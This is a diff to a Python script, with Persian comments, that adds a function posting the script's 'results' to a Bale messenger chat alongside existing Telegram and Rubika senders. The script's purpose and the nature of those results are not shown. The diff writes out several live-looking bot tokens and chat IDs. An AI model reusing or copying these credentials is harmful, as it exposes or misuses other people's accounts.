@@ -35,6 +35,11 @@ RUBIKA_CHAT_ID = "g0ILUMK0562851bf38dfcd7703bdeb22"
 TELEGRAM_BOT_TOKEN = "8851868234:AAFHxnxQ8AnHubsHtx0fNYtZ4mdGdUyXIoI"
 TELEGRAM_CHAT_ID = "-1004437972136"
 
+# ========== افزودن توکن و شناسه بله ==========
+BALE_BOT_TOKEN = "2690620:Nm1F_42X7P1ZMCg8VMMsQaMKDgDOEbSIvUk"
+BALE_CHAT_ID = "5495275998"
+# ===========================================
+
 TELEGRAM_ID = "@Pod66Mp"
 RUBIKA_ID = "@Amir5880Om"
 
@@ -110,9 +115,32 @@ def send_to_rubika(text):
                     print(Colors.RED + "[!] Failed to send to Rubika after 3 attempts." + Colors.END)
 
 
+# ========== تابع جدید برای ارسال به بله ==========
+def send_to_bale(text):
+    if not BALE_BOT_TOKEN or not BALE_CHAT_ID:
+        return
+    url = f"https://api.bale.ai/v1/bots/{BALE_BOT_TOKEN}/sendMessage"
+    max_length = 4000
+    chunks = [text[i:i + max_length] for i in range(0, len(text), max_length)]
+    print(Colors.BLUE + "[*] Sending results to Bale..." + Colors.END)
+    for chunk in chunks:
+        payload = {"chat_id": BALE_CHAT_ID, "text": chunk}
+        for attempt in range(3):
+            try:
+                res = requests.post(url, json=payload, timeout=15)
+                if res.status_code == 200:
+                    print(Colors.GREEN + "[+] Successfully sent to Bale!" + Colors.END)
+                    break
+            except Exception:
+                if attempt == 2:
+                    print(Colors.RED + "[!] Failed to send to Bale after 3 attempts." + Colors.END)
+# =================================================
+
+
 def send_all(text):
     send_to_telegram(text)
     send_to_rubika(text)
+    send_to_bale(text)  # افزودن بله به تابع ارسال همگانی
 
 
 def get_clean_input(prompt_text):
